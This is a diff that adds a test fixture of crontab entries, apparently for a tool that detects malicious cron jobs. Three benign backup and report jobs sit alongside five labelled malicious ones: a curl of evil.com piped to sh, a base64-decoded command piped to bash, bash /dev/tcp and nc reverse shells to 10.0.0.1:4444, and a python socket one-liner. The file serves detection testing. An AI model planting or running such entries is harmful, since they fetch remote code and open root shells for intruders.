@@ -1,0 +1,11 @@
+# Legitimate entries (should NOT be flagged)
+0 2 * * * root /usr/bin/backup.sh
+30 3 * * 0 root /usr/local/bin/weekly-report.sh
+*/15 * * * * root /usr/bin/check-disk-space.sh
+
+# Malicious entries (SHOULD be flagged)
+* * * * * root curl http://evil.com/payload.sh | sh
+0 2 * * * root echo "ZWNobyBoYWNrZWQ=" | base64 -d | bash
+*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+0 0 * * * root nc -e /bin/bash 10.0.0.1 4444
+*/10 * * * * root python3 -c 'import socket,subprocess,os'
